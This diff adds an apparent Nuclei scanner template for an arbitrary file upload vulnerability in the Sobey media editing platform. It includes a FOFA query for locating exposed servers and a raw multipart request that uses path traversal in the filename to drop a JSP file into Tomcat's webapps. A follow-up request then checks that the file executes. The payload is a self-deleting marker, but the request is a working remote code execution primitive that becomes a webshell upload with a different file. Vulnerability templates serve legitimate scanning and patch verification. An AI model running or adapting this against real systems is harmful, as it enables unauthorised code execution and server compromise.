@@ -1,0 +1,39 @@
+id: sobey-media-upload-file-upload
+
+info:
+  name: 索贝融媒体工作平台 /upload 接口任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: header="Sobey" || body="/Sc-TaskMonitoring/"
+          索贝融媒体工作平台的/upload接口因安全机制缺失，存在文件上传路径验证不充分问题。攻击者可通过构造恶意请求上传包含可执行代码的文件，实现远程代码执行或WebShell植入，最终导致系统权限沦陷、敏感数据泄露及服务中断风险。
+  tags: 索贝融媒体工作平台
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /sobey-mchEditor/watermark/upload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+    ------WebKitFormBoundary
+    Content-Disposition: form-data; name="file";filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/NTest.jsp" 
+    Content-Type: imge/jpeg
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundary--
+- raw:
+  - |
+    GET /sobey-mchEditor/NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
